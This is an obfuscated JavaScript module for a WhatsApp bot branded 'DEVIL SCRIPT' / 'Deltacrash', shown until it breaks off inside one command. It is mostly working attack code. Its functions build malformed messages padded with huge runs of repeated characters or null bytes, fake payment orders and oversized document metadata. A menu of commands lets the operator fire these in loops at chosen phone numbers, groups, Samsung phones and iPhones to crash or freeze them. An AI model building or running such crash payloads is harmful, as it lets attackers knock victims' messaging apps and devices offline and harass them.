module.exports = async (_0x29487e, _0x26c51b, _0xe164a1) => {
  try {
    const _0x392fef = _0x26c51b.key.remoteJid;
    const _0x51b3e9 = _0x26c51b.quoted ? _0x26c51b.quoted : _0x26c51b;
    const _0x47e819 = _0x26c51b.mtype === "conversation" && _0x26c51b.message.conversation ? _0x26c51b.message.conversation : _0x26c51b.mtype == "imageMessage" && _0x26c51b.message.imageMessage.caption ? _0x26c51b.message.imageMessage.caption : _0x26c51b.mtype == "documentMessage" && _0x26c51b.message.documentMessage.caption ? _0x26c51b.message.documentMessage.caption : _0x26c51b.mtype == "videoMessage" && _0x26c51b.message.videoMessage.caption ? _0x26c51b.message.videoMessage.caption : _0x26c51b.mtype == "extendedTextMessage" && _0x26c51b.message.extendedTextMessage.text ? _0x26c51b.message.extendedTextMessage.text : _0x26c51b.mtype == "buttonsResponseMessage" && _0x26c51b.message.buttonsResponseMessage.selectedButtonId ? _0x26c51b.message.buttonsResponseMessage.selectedButtonId : _0x26c51b.mtype == 'templateButtonReplyMessage' && _0x26c51b.message.templateButtonReplyMessage.selectedId ? _0x26c51b.message.templateButtonReplyMessage.selectedId : '';
    const _0x362dff = typeof _0x26c51b.text == "string" ? _0x26c51b.text : '';
    const _0x460782 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x47e819) ? _0x47e819.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0xcc707e = _0x47e819.startsWith(_0x460782);
    const _0x256829 = _0xcc707e ? _0x47e819.slice(_0x460782.length).trim().split(" ").shift().toLowerCase() : '';
    const _0x135d23 = _0x47e819.trim().split(/ +/).slice(0x1);
    const _0x1b77d5 = q = _0x135d23.join(" ");
    const _0x4d99bd = _0x392fef.endsWith("@g.us");
    const _0x550b92 = await _0x29487e.decodeJid(_0x29487e.user.id);
    const _0x4c74ff = _0x26c51b.key.fromMe ? _0x29487e.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x29487e.user.id : _0x26c51b.key.participant || _0x26c51b.key.remoteJid;
    const _0x238c36 = _0x4c74ff.split('@')[0x0];
    const _0x410077 = _0x26c51b.pushName || '' + _0x238c36;
    const _0x15765b = _0x550b92.includes(_0x238c36);
    const _0x17a59d = _0x4d99bd ? await _0x29487e.groupMetadata(_0x26c51b.chat)["catch"](_0x2c8230 => {}) : '';
    const _0x38988b = _0x4d99bd ? await _0x17a59d.participants : '';
    const _0x4c368a = _0x4d99bd ? await _0x38988b.filter(_0x2108ff => _0x2108ff.admin !== null).map(_0x555515 => _0x555515.id) : '';
    const _0x90dc99 = _0x4d99bd ? _0x4c368a.includes(_0x550b92) : false;
    const _0xafbee3 = require("javascript-obfuscator");
    const {
      addSaldo: _0x2134af,
      minSaldo: _0x4187a5,
      cekSaldo: _0x72dce4
    } = require("./all/database/deposit");
    if (_0x26c51b.sender.startsWith("212")) {
      return _0x29487e.updateBlockStatus(_0x26c51b.sender, "block");
    }
    if (_0xcc707e) {
      console.log(chalk.white.bgRed.bold("🔥 Ada pesan, Om"), color("[ DEVIL SCRIPT ]", "green"), color('FROM', "red"), color('' + _0x410077, "red"), color("Text :", "yellow"), color('' + _0x47e819, "blue"));
    }
    const _0x1ceee3 = moment().tz('Asia/Jakarta').format("HH:mm:ss");
    if (_0x1ceee3 < "23:59:00") {
      var _0x7a25ed = "Selamat Malam 🏙️";
    }
    if (_0x1ceee3 < "19:00:00") {
      var _0x7a25ed = "Selamat Petang 🌆";
    }
    if (_0x1ceee3 < "18:00:00") {
      var _0x7a25ed = "Selamat Sore 🌇";
    }
    if (_0x1ceee3 < "15:00:00") {
      var _0x7a25ed = "Selamat Siang 🌤️";
    }
    if (_0x1ceee3 < "10:00:00") {
      var _0x7a25ed = "Selamat Pagi 🌄";
    }
    if (_0x1ceee3 < '05:00:00') {
      var _0x7a25ed = "Selamat Subuh 🌆";
    }
    if (_0x1ceee3 < '03:00:00') {
      var _0x7a25ed = "Selamat Tengah Malam 🌃";
    }
    const _0x24d502 = JSON.parse(fs.readFileSync('./all/database/premium.json'));
    const _0x3b8ab9 = JSON.parse(fs.readFileSync('./all/database/owner.json'));
    const _0x5e0f00 = _0x24d502.includes(_0x4c74ff);
    const _0x46a982 = _0x3b8ab9.includes(_0x238c36) || _0x15765b;
    _0x29487e.sendButtonVideo = async (_0x223bf1, _0x567a3b, _0x4a0ae9, _0x2ecf56 = {}) => {
      var _0x3a7f96 = await prepareWAMessageMedia({
        'video': {
          'url': _0x2ecf56 && _0x2ecf56.video ? _0x2ecf56.video : ''
        }
      }, {
        'upload': _0x29487e.waUploadToServer
      });
      let _0x4bb3e7 = generateWAMessageFromContent(_0x223bf1, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'body': {
                'text': _0x2ecf56 && _0x2ecf56.body ? _0x2ecf56.body : ''
              },
              'footer': {
                'text': _0x2ecf56 && _0x2ecf56.footer ? _0x2ecf56.footer : ''
              },
              'header': {
                'hasMediaAttachment': true,
                'videoMessage': _0x3a7f96.videoMessage
              },
              'nativeFlowMessage': {
                'buttons': _0x567a3b,
                'messageParamsJson': ''
              },
              'contextInfo': {
                'externalAdReply': {
                  'title': global.namabot,
                  'body': "By anggazyyy",
                  'thumbnailUrl': global.imageurl,
                  'sourceUrl': global.isLink,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }
          }
        }
      }, {
        'quoted': _0x4a0ae9
      });
      await _0x29487e.sendPresenceUpdate("composing", _0x223bf1);
      return _0x29487e.relayMessage(_0x223bf1, _0x4bb3e7.message, {
        'messageId': _0x4bb3e7.key.id
      });
    };
    const _0x1a2bd4 = {
      'key': {
        'remoteJid': "status@broadcast",
        'fromMe': false,
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'listResponseMessage': {
          'title': 'Delta'
        }
      }
    };
    const _0x1c96d1 = {
      'key': {
        'participant': "0@s.whatsapp.net",
        ...(_0x26c51b.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync("./image/latx.png")
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'review_and_pay',
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍ĐɆⱠ₮₳ ₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x16bebe = {
      'key': {
        'participant': '0@s.whatsapp.net',
        ...(_0x26c51b.chat ? {
          'remoteJid': 'status@broadcast'
        } : {})
      },
      'message': {
        'interactiveMessage': {
          'header': {
            'hasMediaAttachment': true,
            'jpegThumbnail': fs.readFileSync('./image/latx.png')
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': "review_and_pay",
              'buttonParamsJson': "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍ĐɆⱠ₮₳ ₵Ɽ₳₴Ⱨ╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x98b60e = {
      'key': {
        'participant': '0@s.whatsapp.net',
        ...(_0x26c51b.chat ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'listResponseMessage': {
          'title': "pois0n - DevilS"
        }
      }
    };
    let _0x2e0aa0 = [];
    for (let _0x84a390 of _0x3b8ab9) {
      _0x2e0aa0.push({
        'displayName': await _0x29487e.getName(_0x84a390 + "@s.whatsapp.net"),
        'vcard': "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x29487e.getName(_0x84a390 + "@s.whatsapp.net")) + "\n\nFN:" + (await _0x29487e.getName(_0x84a390 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x84a390 + ':' + _0x84a390 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET:yoshii@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://youtube.com/@deltatech.i?si=1j_c48ZxWw99i-Tq\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    try {
      ppuser = await _0x29487e.profilePictureUrl(_0x26c51b.sender, "image");
    } catch (_0x14b32e) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x59bb05(_0x246f32) {
      return new Promise((_0x3fd759, _0x18f6e5) => {
        try {
          const _0x3ad38f = _0xafbee3.obfuscate(_0x246f32, {
            'compact': false,
            'controlFlowFlattening': true,
            'controlFlowFlatteningThreshold': 0x1,
            'numbersToExpressions': true,
            'simplify': true,
            'stringArrayShuffle': true,
            'splitStrings': true,
            'stringArrayThreshold': 0x1
          });
          const _0x4cf9a6 = {
            'status': 0xc8,
            'author': "Delta",
            'result': _0x3ad38f.getObfuscatedCode()
          };
          _0x3fd759(_0x4cf9a6);
        } catch (_0x164a40) {
          _0x18f6e5(_0x164a40);
        }
      });
    }
    async function _0x29f40b(_0x3c032f, _0x3dfd86) {
      var _0x2e0a1c = generateWAMessageFromContent(_0x3c032f, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp" + 'ꦾ'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x3c032f,
        'quoted': _0x3dfd86
      });
      await _0x29487e.relayMessage(_0x3c032f, _0x2e0a1c.message, {
        'participant': {
          'jid': _0x3c032f
        },
        'messageId': _0x2e0a1c.key.id
      });
    }
    async function _0xe54870(_0x2332c7, _0x5c59fa) {
      for (let _0x30768f = 0x0; _0x30768f < _0x5c59fa; _0x30768f++) {
        let _0x532e56 = generateWAMessageFromContent(_0x2332c7, {
          'viewOnceMessage': {
            'message': {
              'messageContextInfo': {
                'deviceListMetadata': {},
                'deviceListMetadataVersion': 0x2
              },
              'interactiveMessage': proto.Message.InteractiveMessage.create({
                'body': proto.Message.InteractiveMessage.Body.create({
                  'text': ''
                }),
                'footer': proto.Message.InteractiveMessage.Footer.create({
                  'text': ''
                }),
                'header': proto.Message.InteractiveMessage.Header.create({
                  'title': '',
                  'subtitle': '',
                  'hasMediaAttachment': false
                }),
                'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  'buttons': [{
                    'name': "cta_url",
                    'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                  }],
                  'messageParamsJson': "\0".repeat(0x186a0)
                })
              })
            }
          }
        }, {});
        _0x29487e.relayMessage(_0x2332c7, _0x532e56.message, {
          'messageId': _0x532e56.key.id
        });
      }
    }
    async function _0x141b6c(_0x2fa08c) {
      var _0x4c65c3 = generateWAMessageFromContent(_0x2fa08c, proto.Message.fromObject({
        'viewOnceMessage': {
          'message': {
            'liveLocationMessage': {
              'degreesLatitude': 'p',
              'degreesLongitude': 'p',
              'caption': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + 'ê¦¾'.repeat(0xc350),
              'sequenceNumber': '0',
              'jpegThumbnail': ''
            }
          }
        }
      }), {
        'userJid': _0x2fa08c
      });
      await _0x29487e.relayMessage(_0x2fa08c, _0x4c65c3.message, {
        'participant': {
          'jid': _0x2fa08c
        },
        'messageId': _0x4c65c3.key.id
      });
    }
    async function _0x13937f(_0xa5bd1b) {
      var _0x47420f = generateWAMessageFromContent(_0xa5bd1b, proto.Message.fromObject({
        'listMessage': {
          'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(0xe09c0),
          'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': 'lol',
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "lol",
        'contextInfo': {
          'expiration': 0x927c0,
          'ephemeralSettingTimestamp': "1679959486",
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': 'whatsapp',
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': 'INITIATED_BY_ME'
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0xa5bd1b
      });
      await _0x29487e.relayMessage(_0xa5bd1b, _0x47420f.message, {
        'participant': {
          'jid': _0xa5bd1b
        },
        'messageId': _0x47420f.key.id
      });
    }
    async function _0x559b2f(_0x887455, _0x3df247) {
      for (let _0x400549 = 0x0; _0x400549 < _0x3df247; _0x400549++) {
        _0x141b6c(_0x887455);
        _0x13937f(_0x887455);
        await sleep(0x1f4);
      }
    }
    function _0x324cd4(_0x5bf052, _0x595ee1 = [], _0x48e3c3 = false) {
      return _0x48e3c3 == null || _0x48e3c3 == undefined || _0x48e3c3 == false ? _0x29487e.sendMessage(_0x26c51b.chat, {
        'text': _0x5bf052,
        'mentions': _0x595ee1
      }, {
        'quoted': _0x26c51b
      }) : _0x29487e.sendMessage(_0x26c51b.chat, {
        'text': _0x5bf052,
        'mentions': _0x595ee1
      }, {
        'quoted': _0x26c51b
      });
    }
    async function _0x4df23c(_0x14ca86) {
      await _0x29487e.relayMessage(_0x14ca86, {
        'paymentInviteMessage': {
          'serviceType': "FBPAY",
          'expiryTimestamp': Date.now() + 0x6c258c00
        }
      }, {
        'participant': {
          'jid': _0x14ca86
        }
      });
    }
    async function _0xac0c3(_0xdf8023, _0x1d1179) {
      var _0x53ace0 = generateWAMessageFromContent(_0xdf8023, proto.Message.fromObject({
        'documentMessage': {
          'url': "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          'mimetype': 'penis',
          'fileSha256': "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          'fileLength': "999999999",
          'pageCount': 0x3b9ac9ff,
          'mediaKey': '5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=',
          'fileName': "✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp" + 'ྦྷ'.repeat(0xea60),
          'fileEncSha256': 'pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=',
          'directPath': "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          'mediaKeyTimestamp': "1715880173"
        }
      }), {
        'userJid': _0xdf8023,
        'quoted': _0x1d1179
      });
      await _0x29487e.relayMessage(_0xdf8023, _0x53ace0.message, {
        'participant': {
          'jid': _0xdf8023
        },
        'messageId': _0x53ace0.key.id
      });
    }
    async function _0x56a1f9(_0x179b44, _0x3e953a) {
      var _0x1c7692 = generateWAMessageFromContent(_0x179b44, proto.Message.fromObject({
        'stickerMessage': {
          'url': 'https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true',
          'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          'fileEncSha256': 'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=',
          'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          'mimetype': "image/webp",
          'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          'fileLength': "10116",
          'mediaKeyTimestamp': "1715876003",
          'isAnimated': false,
          'stickerSentTs': "1715881084144",
          'isAvatar': false,
          'isAiSticker': false,
          'isLottie': false
        }
      }), {
        'userJid': _0x179b44,
        'quoted': _0x3e953a
      });
      await _0x29487e.relayMessage(_0x179b44, _0x1c7692.message, {
        'participant': {
          'jid': _0x179b44
        },
        'messageId': _0x1c7692.key.id
      });
    }
    if (!_0x29487e["public"]) {
      if (!_0x26c51b.key.fromMe) {
        return;
      }
    }
    async function _0x46eca1(_0x2c9a57, _0x6b1a2) {
      var _0x3c5edc = generateWAMessageFromContent(_0x2c9a57, proto.Message.fromObject({
        'interactiveMessage': {
          'header': {
            'title': "🩸⃟༑⌁⃰Đɇⱡ₮₳ 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
            'hasMediaAttachment': true,
            ...(await prepareWAMessageMedia({
              'image': {
                'url': 'https://telegra.ph/file/0d557c48dfa376732ac43.jpg'
              }
            }, {
              'upload': _0x29487e.waUploadToServer
            }))
          },
          'body': {
            'text': ''
          },
          'footer': {
            'text': "›          #Deltacrash"
          },
          'nativeFlowMessage': {
            'messageParamsJson': "\0".repeat(0xf4240)
          }
        }
      }), {
        'userJid': _0x2c9a57,
        'quoted': _0x6b1a2
      });
      await _0x29487e.relayMessage(_0x2c9a57, _0x3c5edc.message, {
        'participant': {
          'jid': _0x2c9a57
        },
        'messageId': _0x3c5edc.key.id
      });
    }
    async function _0x4018dc(_0x59d68f, _0x474228) {
      var _0x5ad390 = generateWAMessageFromContent(_0x59d68f, proto.Message.fromObject({
        'listMessage': {
          'title': "⟠ DevilS ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(0xe09c0),
          'footerText': "✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp",
          'description': "✳️᜴࿆͆᷍𝗭̺𝗘𝗧᷹̚𝗦𝗨̵̱𝗕̺𝗢𝗫͆𝗬𝗚̠̚𝗘𝗡̿╮⭑ ☠️⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴▴𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮.xp",
          'buttonText': null,
          'listType': 0x2,
          'productListInfo': {
            'productSections': [{
              'title': 'anjay',
              'products': [{
                'productId': "4392524570816732"
              }]
            }],
            'productListHeaderImage': {
              'productId': "4392524570816732",
              'jpegThumbnail': null
            },
            'businessOwnerJid': "0@s.whatsapp.net"
          }
        },
        'footer': "puki",
        'contextInfo': {
          'expiration': 0x93a80,
          'ephemeralSettingTimestamp': '1679959486',
          'entryPointConversionSource': "global_search_new_chat",
          'entryPointConversionApp': "whatsapp",
          'entryPointConversionDelaySeconds': 0x9,
          'disappearingMode': {
            'initiator': "INITIATED_BY_ME"
          }
        },
        'selectListType': 0x2,
        'product_header_info': {
          'product_header_info_id': 0x4433e2e130,
          'product_header_is_rejected': false
        }
      }), {
        'userJid': _0x59d68f,
        'quoted': _0x98b60e
      });
      await _0x29487e.relayMessage(_0x59d68f, _0x5ad390.message, {
        'participant': {
          'jid': _0x59d68f
        },
        'messageId': _0x5ad390.key.id
      });
    }
    const _0x33e474 = await reSize(ppuser, 0x12c, 0x12c);
    const _0x5c4040 = _0x77e0a => {
      _0x29487e.sendMessage(_0x392fef, {
        'text': _0x77e0a,
        'contextInfo': {
          'externalAdReply': {
            'showAdAttribution': true,
            'title': 'DELTACRASH',
            'containsAutoReply': true,
            'mediaType': 0x1,
            'thumbnail': _0x33e474,
            'mediaUrl': 'https://telegra.ph/file/0d557c48dfa376732ac43.jpg',
            'sourceUrl': " "
          }
        }
      }, {
        'quoted': _0x26c51b
      });
    };
    if (_0x26c51b.isGroup && !_0x26c51b.key.fromMe && !_0x46a982 && antilink) {
      if (!_0x90dc99) {
        return;
      }
      if (_0x362dff.match("whatsapp.com")) {
        _0x29487e.sendMessage(_0x26c51b.chat, {
          'text': "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + _0x17a59d.subject
        }, {
          'quoted': _0x26c51b
        });
        _0x29487e.groupParticipantsUpdate(_0x26c51b.chat, [_0x4c74ff], "delete");
        _0x29487e.sendMessage(_0x26c51b.chat, {
          'delete': _0x26c51b.key
        });
      }
    }
    switch (_0x256829) {
      case "menu":
        {
          const _0x40042b = "\n꫞ *Hi* @" + _0x4c74ff.split('@')[0x0] + "\n\n╭•┈┈⛧┈♛ *I͜͡N͜͡F͜͡O͜͡ U͜͡S͜͡R͜͡* ♛┈⛧┈┈•༶\n│ღ   Name  : " + _0x410077 + "\n│ღ   Status : " + (_0x5e0f00 ? "Premium" : "Free") + "\n└──ᘏツ\n\n╭─×͜× 〣 *MENU DO VÍRUS DELTA* 〢\n│ღ   " + _0x460782 + "delta1 62xxx\n│ღ   " + _0x460782 + "delta2 62xxx\n│ღ   " + _0x460782 + "delta3 62xxxx\n│ღ   " + _0x460782 + "delta4 62xxx|jumlah\n│ღ   " + _0x460782 + "notif-ui 62xxx\n│ღ   " + _0x460782 + "delta-virus 62xxx\n│ღ   " + _0x460782 + "crash-total 62xxx\n│ღ   " + _0x460782 + "devilbug 62xxx\n│ღ   " + _0x460782 + "nolimit 62xxx\n╰×͜×\n\n╭─×͜× 〣 *ERROR NO MENU INTERNO* 〢\n│ღ   " + _0x460782 + "delta-novo <62xxx, jumlah>\n│ღ   " + _0x460782 + "reset-ui <62xxx, jumlah>\n│ღ   " + _0x460782 + "delta-crash1 <62xxx, jumlah>\n│ღ   " + _0x460782 + "devil-internal <62xxx, jumlah>\n│ღ   " + _0x460782 + "devil-external <62xxx, jumlah>\n│ღ   " + _0x460782 + "engine-crash <62xxx, jumlah>\n│ღ   " + _0x460782 + "engine-internal <62xxx, jumlah>\n│ღ   " + _0x460782 + "engine-external <62xxx, jumlah>\n│ღ   " + _0x460782 + "engine-ui <62xxx, jumlah>\n│ღ   " + _0x460782 + "bug-engine <62xxx, jumlah>\n│ღ   " + _0x460782 + "bug-quoted <62xxx>\n│ღ   " + _0x460782 + "internal-quoted <62xxx>\n│ღ   " + _0x460782 + "external-quoted <62xxx>\n╰×͜×\n\n╭─×͜× 〣 *MENU GRUPO CHOQUE DELTA* 〢\n│ღ   " + _0x460782 + "bug-button <link group>\n│ღ   " + _0x460782 + "bug-sitexyz <link group>\n│ღ   " + _0x460782 + "button-internal <link group>\n│ღ   " + _0x460782 + "button-external <link group>\n│ღ   " + _0x460782 + "ui-grup <link group>\n│ღ   " + _0x460782 + "bug-hole <120###@g.us>\n│ღ   " + _0x460782 + "enemygroup <120###@g.us>\n│ღ   " + _0x460782 + "internal-group <120###@g.us>\n│ღ   " + _0x460782 + "external-group <120###@g.us>\n╰×͜×\n\n╭─×͜× 〣 *ERROR DE MENU ANDROID* 〢\n│ღ   " + _0x460782 + "samsung-bug <62xxx>\n│ღ   " + _0x460782 + "samsung-ui <62xxx>\n│ღ   " + _0x460782 + "samsung-internal <62xxx>\n│ღ   " + _0x460782 + "samsung-external <62xxx>\n│ღ   " + _0x460782 + "samsung-reboot <62xxx>\n│ღ   " + _0x460782 + "samsung-crash <62xxx>\n╰×͜×\n\n╭─×͜× 〣 *MENU DE ATRASO NO IPHONE* 〢\n│ღ   " + _0x460782 + "ios-ui <62xxx>\n│ღ   " + _0x460782 + "delta-nodevil <62xxx>\n│ღ   " + _0x460782 + "ios-infinity <62xxx|timer>\n│ღ   " + _0x460782 + "ios-uicrash <62xxx|timer>\n╰×͜×\n\n╭─×͜× 〣 *ZONA EXCLUSIVA PROPRIETÁRIO BOT* 〢\n│ღ   " + _0x460782 + "self\n│ღ   " + _0x460782 + "public\n│ღ   " + _0x460782 + "addprem 62xx\n│ღ   " + _0x460782 + "delprem 62xx\n╰×͜×\n";
          _0x29487e.sendMessage(_0x26c51b.chat, {
            'text': _0x40042b,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': false,
                'title': global.namabot,
                'body': global.namaCreator,
                'thumbnailUrl': global.imageurl,
                'sourceUrl': global.isLink,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x26c51b
          });
          await _0x29487e.sendMessage(_0x26c51b.chat, {
            'audio': fs.readFileSync("./all/menu.mp3"),
            'mimetype': "all/menu.mp3",
            'ptt': true
          }, {
            'quoted': _0x26c51b
          });
        }
        break;
      case 'jomok-blank':
        {
          if (!_0x5e0f00) {
            return _0x5c4040(mess.only.premium);
          }
          if (!q) {
            return _0x5c4040("Usage ." + _0x256829 + " 94742274855");
          }
          let _0x20a55b = q.replace(/[^0-9]/g, '');
          if (_0x20a55b.startsWith('0')) {
            return _0x5c4040("<!> The number starts with the number 0. Replace it with the number starting with the country code\n\n<✓> Example : ." + _0x256829 + " 94742274855");
          }
          let _0x552cc0 = _0x20a55b + "@s.whatsapp.net";
          await _0x5c4040("In proses....");
          for (let _0x25672c = 0x0; _0x25672c < 0x1e; _0x25672c++) {
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0x29f40b(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
            await _0xac0c3(_0x552cc0, _0x1c96d1);
